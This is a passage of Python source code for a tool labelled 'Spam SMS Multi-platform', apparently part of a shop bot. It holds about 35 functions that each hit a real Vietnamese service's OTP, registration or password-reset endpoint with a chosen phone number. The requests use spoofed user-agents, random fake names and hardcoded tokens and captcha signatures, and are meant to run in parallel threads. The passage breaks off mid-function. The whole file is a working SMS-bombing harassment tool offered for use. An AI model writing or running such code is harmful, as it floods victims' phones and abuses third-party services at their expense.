"""
SMS Tool - Spam SMS Multi-platform
Dùng cho HDM Shop Bot
"""

from time import sleep
import sys
from colorama import Fore, Back, Style
import random
import requests
import json
from datetime import datetime, timedelta
import time
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading
from threading import BoundedSemaphore
import concurrent.futures

# ============================================================
# CẤU HÌNH
# ============================================================
MAX_THREADS = 18
semaphore = BoundedSemaphore(MAX_THREADS)

# ============================================================
# HELPER
# ============================================================
last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng']
middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

def generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''
    first_name = random.choice(first_names)
    return f"{last_name} {middle_name} {first_name}".strip()

def generate_random_id():
    def random_segment(length):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"

def generate_random_id2():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

random_id = generate_random_id2()
formatted_device_id = format_device_id(random_id)


# ============================================================
# 1. SAPO
# ============================================================
def send_otp_via_sapo(sdt):
    cookies = {
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '07/30/2024 16:21:32',
        'lang': 'vi',
    }
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.sapo.vn',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }
    data = {'phonenumber': sdt}
    try:
        r = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data, timeout=15)
        print(f"[SAPO] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[SAPO] Lỗi: {e}")


# ============================================================
# 2. VIETTEL
# ============================================================
def send_otp_via_viettel(sdt):
    cookies = {
        'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
        'redirectLogin': 'https://viettel.vn/myviettel',
    }
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'phone': sdt,
        'typeCode': 'DI_DONG',
        'actionCode': 'myviettel://login_mobile',
        'type': 'otp_login',
    }
    try:
        r = requests.post('https://viettel.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data, timeout=15)
        print(f"[VIETTEL] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VIETTEL] Lỗi: {e}")


# ============================================================
# 3. MEDICARE
# ============================================================
def send_otp_via_medicare(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'mobile': sdt, 'mobile_country_prefix': '84'}
    try:
        r = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data, timeout=15)
        print(f"[MEDICARE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MEDICARE] Lỗi: {e}")


# ============================================================
# 4. TV360
# ============================================================
def send_otp_via_tv360(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'msisdn': sdt}
    try:
        r = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', headers=headers, json=json_data, timeout=15)
        print(f"[TV360] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TV360] Lỗi: {e}")


# ============================================================
# 5. DIENMAYXANH
# ============================================================
def send_otp_via_dienmayxanh(sdt):
    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
    }
    try:
        r = requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', headers=headers, data=data, timeout=15)
        print(f"[DMX] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[DMX] Lỗi: {e}")


# ============================================================
# 6. KINGFOODMART
# ============================================================
def send_otp_via_kingfoodmart(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) { sendOtp(input: $input) { otpTrackingId __typename } }',
    }
    try:
        r = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=15)
        print(f"[KINGFOOD] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[KINGFOOD] Lỗi: {e}")


# ============================================================
# 7. MOCHA
# ============================================================
def send_otp_via_mocha(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    params = {'msisdn': sdt, 'languageCode': 'vi'}
    try:
        r = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers, timeout=15)
        print(f"[MOCHA] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MOCHA] Lỗi: {e}")


# ============================================================
# 8. FPT PLAY
# ============================================================
def send_otp_via_fptdk(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'referer': 'https://fptplay.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-did': 'A0EB7FD5EA287DBF',
    }
    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }
    try:
        r = requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp', headers=headers, json=json_data, timeout=15)
        print(f"[FPTDK] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[FPTDK] Lỗi: {e}")


# ============================================================
# 9. FPT MK
# ============================================================
def send_otp_via_fptmk(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'referer': 'https://fptplay.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-did': 'A0EB7FD5EA287DBF',
    }
    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }
    try:
        r = requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp', headers=headers, json=json_data, timeout=15)
        print(f"[FPTMK] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[FPTMK] Lỗi: {e}")


# ============================================================
# 10. VIEON
# ============================================================
def send_otp_via_VIEON(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/auth/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    params = {'platform': 'web', 'ui': '012021'}
    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
        'device_name': 'Edge/127',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }
    try:
        r = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data, timeout=15)
        print(f"[VIEON] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VIEON] Lỗi: {e}")


# ============================================================
# 11. GHN
# ============================================================
def send_otp_via_ghn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'phone': sdt, 'type': 'register'}
    try:
        r = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=15)
        print(f"[GHN] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[GHN] Lỗi: {e}")


# ============================================================
# 12. LOTTE MART
# ============================================================
def send_otp_via_lottemart(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.lottemart.vn',
        'referer': 'https://www.lottemart.vn/signup',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'username': sdt, 'case': 'register'}
    try:
        r = requests.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', headers=headers, json=json_data, timeout=15)
        print(f"[LOTTE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[LOTTE] Lỗi: {e}")


# ============================================================
# 13. DONGCRE
# ============================================================
def send_otp_via_DONGCRE(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }
    try:
        r = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data, timeout=15)
        print(f"[DONGCRE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[DONGCRE] Lỗi: {e}")


# ============================================================
# 14. SHOPEE
# ============================================================
def send_otp_via_shopee(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://shopee.vn',
        'referer': 'https://shopee.vn/buyer/signup',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-api-source': 'pc',
        'x-requested-with': 'XMLHttpRequest',
    }
    json_data = {
        'operation': 8,
        'encrypted_phone': '',
        'phone': sdt,
        'supported_channels': [1, 2, 3, 6, 0, 5],
        'support_session': True,
    }
    try:
        r = requests.post('https://shopee.vn/api/v4/otp/get_settings_v2', headers=headers, json=json_data, timeout=15)
        print(f"[SHOPEE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[SHOPEE] Lỗi: {e}")


# ============================================================
# 15. THEGIOIDIDONG
# ============================================================
def send_otp_via_TGDD(sdt):
    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
    }
    try:
        r = requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', headers=headers, data=data, timeout=15)
        print(f"[TGDD] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TGDD] Lỗi: {e}")


# ============================================================
# 16. FPTSHOP
# ============================================================
def send_otp_via_fptshop(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'origin': 'https://fptshop.com.vn',
        'referer': 'https://fptshop.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }
    try:
        r = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data, timeout=15)
        print(f"[FPTSHOP] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[FPTSHOP] Lỗi: {e}")


# ============================================================
# 17. WINMART
# ============================================================
def send_otp_via_WinMart(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'authorization': 'Bearer undefined',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-api-merchant': 'WCM',
    }
    json_data = {
        'firstName': generate_random_name(),
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2000-01-01',
        'gender': 'Male',
    }
    try:
        r = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data, timeout=15)
        print(f"[WINMART] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[WINMART] Lỗi: {e}")


# ============================================================
# 18. VIETLOAN
# ============================================================
def send_otp_via_vietloan(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietloan.vn',
        'referer': 'https://vietloan.vn/register',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'phone': sdt, '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi'}
    try:
        r = requests.post('https://vietloan.vn/register/phone-resend', headers=headers, data=data, timeout=15)
        print(f"[VIETLOAN] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VIETLOAN] Lỗi: {e}")


# ============================================================
# 19. LOZI
# ============================================================
def send_otp_via_lozi(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://lozi.vn',
        'referer': 'https://lozi.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-access-token': 'unknown',
        'x-city-id': '50',
        'x-lozi-client': '1',
    }
    json_data = {'countryCode': '84', 'phoneNumber': sdt}
    try:
        r = requests.post('https://mocha.lozi.vn/v1/invites/use-app', headers=headers, json=json_data, timeout=15)
        print(f"[LOZI] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[LOZI] Lỗi: {e}")


# ============================================================
# 20. F88
# ============================================================
def send_otp_via_F88(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://f88.vn',
        'referer': 'https://f88.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'FullName': generate_random_name(),
        'Phone': sdt,
        'DistrictCode': '024',
        'ProvinceCode': '02',
        'AssetType': 'Car',
        'IsChoose': '1',
        'ShopCode': '',
        'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
        'FormType': 1,
    }
    try:
        r = requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', headers=headers, json=json_data, timeout=15)
        print(f"[F88] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[F88] Lỗi: {e}")


# ============================================================
# 21. SPACET
# ============================================================
def send_otp_via_spacet(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://spacet.vn',
        'referer': 'https://spacet.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    json_data = {'phone': sdt}
    try:
        r = requests.post('https://api.spacet.vn/www/user/phone', headers=headers, json=json_data, timeout=15)
        print(f"[SPACET] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[SPACET] Lỗi: {e}")


# ============================================================
# 22. VINPEARL
# ============================================================
def send_otp_via_vinpearl(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://booking.vinpearl.com',
        'referer': 'https://booking.vinpearl.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-display-currency': 'VND',
    }
    json_data = {'channel': 'vpt', 'username': sdt, 'type': 1, 'OtpChannel': 1}
    try:
        r = requests.post('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', headers=headers, json=json_data, timeout=15)
        print(f"[VINPEARL] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VINPEARL] Lỗi: {e}")


# ============================================================
# 23. TRAVELOKA
# ============================================================
def send_otp_via_traveloka(sdt):
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://www.traveloka.com',
        'referer': 'https://www.traveloka.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-domain': 'user',
        'x-route-prefix': 'vi-vn',
    }
    json_data = {
        'fields': [],
        'data': {'userLoginMethod': 'PN', 'username': sdt},
        'clientInterface': 'desktop',
    }
    try:
        r = requests.post('https://www.traveloka.com/api/v2/user/signup', headers=headers, json=json_data, timeout=15)
        print(f"[TRAVELOKA] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TRAVELOKA] Lỗi: {e}")


# ============================================================
# 24. DONGPLUS
# ============================================================
def send_otp_via_dongplus(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/registration/reg1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'mobile_phone': sdt}
    try:
        r = requests.post('https://api.dongplus.vn/api/v2/user/check-phone', headers=headers, json=json_data, timeout=15)
        print(f"[DONGPLUS] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[DONGPLUS] Lỗi: {e}")


# ============================================================
# 25-26. NHATHUOCLONGCHAU
# ============================================================
def send_otp_via_longchau(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://nhathuoclongchau.com.vn',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-channel': 'EStore',
    }
    json_data = {'phoneNumber': sdt, 'otpType': 0, 'fromSys': 'WEBKHLC'}
    try:
        r = requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', headers=headers, json=json_data, timeout=15)
        print(f"[LONGCHAU1] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[LONGCHAU1] Lỗi: {e}")

def send_otp_via_longchau1(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://nhathuoclongchau.com.vn',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-channel': 'EStore',
    }
    json_data = {'phoneNumber': sdt, 'otpType': 1, 'fromSys': 'WEBKHLC'}
    try:
        r = requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', headers=headers, json=json_data, timeout=15)
        print(f"[LONGCHAU2] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[LONGCHAU2] Lỗi: {e}")


# ============================================================
# 27. GALAXYPLAY
# ============================================================
def send_otp_via_galaxyplay(sdt):
    headers = {
        'accept': '*/*',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'origin': 'https://galaxyplay.vn',
        'referer': 'https://galaxyplay.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {'phone': sdt}
    try:
        r = requests.post('https://api.glxplay.io/account/phone/checkPhoneOnly', params=params, headers=headers, timeout=15)
        print(f"[GALAXYPLAY] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[GALAXYPLAY] Lỗi: {e}")


# ============================================================
# 28. EMARTMALL
# ============================================================
def send_otp_via_emartmall(sdt):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {'mobile': sdt}
    try:
        r = requests.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', headers=headers, data=data, timeout=15)
        print(f"[EMARTMALL] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[EMARTMALL] Lỗi: {e}")


# ============================================================
# 29. AHAMOVE
# ============================================================
def send_otp_via_ahamove(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'referer': 'https://app.ahamove.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'mobile': sdt, 'country_code': 'VN', 'firebase_sms_auth': True}
    try:
        r = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data, timeout=15)
        print(f"[AHAMOVE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[AHAMOVE] Lỗi: {e}")


# ============================================================
# 30. VIETTELMONEY
# ============================================================
def send_otp_via_ViettelMoney(sdt):
    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"
    payload = json.dumps({
        "identityType": "msisdn",
        "identityValue": sdt,
        "type": "REGISTER"
    })
    headers = {
        'User-Agent': "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
        'Content-Type': "application/json",
        'app-version': "8.8.8",
        'product': "VIETTELPAY",
        'type-os': "ios",
        'accept-language': "vi",
    }
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        print(f"[VIETTELMONEY] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VIETTELMONEY] Lỗi: {e}")


# ============================================================
# 31. XANHSM SMS
# ============================================================
def send_otp_via_xanhsmsms(sdt):
    if sdt.startswith('09') or sdt.startswith('03'):
        sdt = '+84' + sdt[1:]
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"
    params = {'aud': "user_app", 'platform': "ios"}
    payload = json.dumps({
        "is_forgot_password": False,
        "phone": sdt,
        "provider": "VIET_GUYS"
    })
    headers = {
        'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
        'Content-Type': "application/json",
        'app-version-label': "3.15.0",
        'app-build-number': "89",
        'accept-language': "vi",
        'platform': "iOS",
        'aud': "user_app"
    }
    try:
        r = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        print(f"[XANHSM-SMS] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[XANHSM-SMS] Lỗi: {e}")


# ============================================================
# 32. XANHSM ZALO
# ============================================================
def send_otp_via_xanhsmzalo(sdt):
    if sdt.startswith('09') or sdt.startswith('03'):
        sdt = '+84' + sdt[1:]
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"
    params = {'platform': "ios", 'aud': "user_app"}
    payload = json.dumps({
        "phone": sdt,
        "is_forgot_password": False,
        "provider": "ZNS_ZALO"
    })
    headers = {
        'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
        'Content-Type': "application/json",
        'app-version-label': "3.15.0",
        'app-build-number': "89",
        'accept-language': "vi",
        'platform': "iOS",
        'aud': "user_app"
    }
    try:
        r = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        print(f"[XANHSM-ZALO] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[XANHSM-ZALO] Lỗi: {e}")


# ============================================================
# 33. POPEYES
# ============================================================
def send_otp_via_popeyes(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-client': 'WebApp',
    }
    json_data = {
        'phone': sdt,
        'firstName': 'Nguyễn',
        'lastName': 'Ngọc',
        'email': 'test@example.com',
        'password': 'Test@123456',
    }
    try:
        r = requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, json=json_data, timeout=15)
        print(f"[POPEYES] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[POPEYES] Lỗi: {e}")


# ============================================================
# 34. ACHECKIN
# ============================================================
def send_otp_via_ACHECKIN(sdt):
    try:
        # Request 1
        params1 = {
            'deployment_key': "NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd",
            'app_version': "1.5",
            'package_hash': "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
            'label': "v39",
            'client_unique_id': generate_random_id2()
        }
        headers1 = {
            'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
            'Accept': "application/json",
        }
        requests.get("https://codepush.appcenter.ms/v0.1/public/codepush/update_check", params=params1, headers=headers1, timeout=15)

        # Request 2
        payload2 = json.dumps({
            "operationName": "IdCheckPhoneNumber",
            "variables": {"phone_number": sdt},
            "query": "query IdCheckPhoneNumber($phone_number: String!) {\n  mutation: checkPhoneNumber(phone_number: $phone_number)\n}\n"
        })
        headers2 = {
            'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
            'Content-Type': "application/json",
            'accept-language': "vi-VN,vi;q=0.9",
            'authorization': "undefined"
        }
        requests.post("https://id.acheckin.vn/api/graphql/v2/mobile", data=payload2, headers=headers2, timeout=15)

        # Request 3
        payload3 = json.dumps({
            "operationName": "RequestVoiceOTP",
            "variables": {
                "phone_number": sdt,
                "action": "REGISTER",
                "hash": "6af5e4ed78ee57fe21f0d405c752798f"
            },
            "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
        })
        r = requests.post("https://id.acheckin.vn/api/graphql/v2/mobile", data=payload3, headers=headers2, timeout=15)
        print(f"[ACHECKIN] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[ACHECKIN] Lỗi: {e}")


# ============================================================
# 35. APPOTA
# ============================================================
def send_otp_via_APPOTA(sdt):
    try:
        # Request 1
        payload1 = json.dumps({
            "insider_id": random_id,
            "partner_name": "appotapay",
            "reason": "default",
            "udid": random_id,
            "device_info": {
                "location_enabled": False,
                "app_version": "5.2.10",
                "push_enabled": True,
                "os_version": "17.0.2",
                "battery": 90,
                "sdk_version": "13.4.3-RN-6.4.4-nh",
                "connection": "wifi"
            }
        })
        headers1 = {
            'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
            'Content-Type': "application/json",
            'accept-language': "vi-VN,vi;q=0.9"
        }
